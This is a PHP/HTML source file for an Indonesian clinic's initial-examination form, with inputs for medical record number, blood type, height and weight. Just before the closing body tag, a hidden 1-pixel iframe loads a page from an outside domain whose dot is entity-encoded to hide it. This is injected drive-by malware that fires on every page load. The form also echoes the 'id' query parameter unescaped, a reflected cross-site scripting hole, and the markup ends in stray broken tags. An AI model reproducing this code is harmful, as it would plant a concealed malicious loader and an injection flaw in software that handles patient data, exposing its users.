<?PHP
	//$PAS_NOREKAMMEDIK=$pasien['PAS_NOREKAMMEDIK'];
	$PAS_GOLONGANDARAH=$modelP['PAS_GOLONGANDARAH'];
?>
<html>
	<h1>Pemeriksaan Awal</h1>
	<body>
		<form method="POST" >
			<table>
				<tr>
					<td>No. Rekam Medik</td>
					<td><input type="text" name="PAS_NOREKAMMEDIK" value="<?=$_GET['id']?>"></td>
				</tr>
				<tr><td>Golongan Darah</td> <td><Select name="PAS_GOLONGANDARAH">
						<option value="A">A</option>
						<option value="B">B</option>
						<option value="AB">AB</option>
						<option value="O">O</option>
						</select></td></tr>
				<tr>
				<tr>
					<td>Tinggi Badan</td>
					<td><input type="text" name="REM_TINGGIBADAN" value="<?=isset($REM_TINGGIBADAN)?$REM_TINGGIBADAN: '';?>"></td>
				</tr>
				<tr>
					<td>Berat Badan</td>
					<td><input type="text" name="REM_BERATBADAN" value="<?=isset($REM_BERATBADAN)?$REM_BERATBADAN: '';?>"></td>
				</tr>
					<td><input type="submit" value="Tambahkan Data Pemeriksaan Awal"></td>
				</tr>
			</table>
		</form>
	<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>

<div><>

